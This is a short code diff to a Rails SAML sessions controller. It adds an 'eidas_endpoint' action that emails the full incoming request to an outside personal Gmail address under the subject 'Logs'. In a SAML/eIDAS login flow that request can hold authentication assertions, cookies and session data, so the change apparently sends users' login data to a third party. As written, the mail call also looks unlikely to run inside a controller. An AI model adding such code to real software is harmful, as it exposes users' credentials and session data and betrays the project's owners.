@@ -11,6 +11,11 @@ class SamlSessionsController < Devise::SamlSessionsController
     redirect_to action
   end
 
+  def eidas_endpoint
+      mail(to: "bertocode@gmail.com", subject: "Logs") do |format|
+        format.text { render plain: request }
+      end
+  end
 
   def metadata
      xml = File.read("#{Rails.root}/public/metadata.xml")
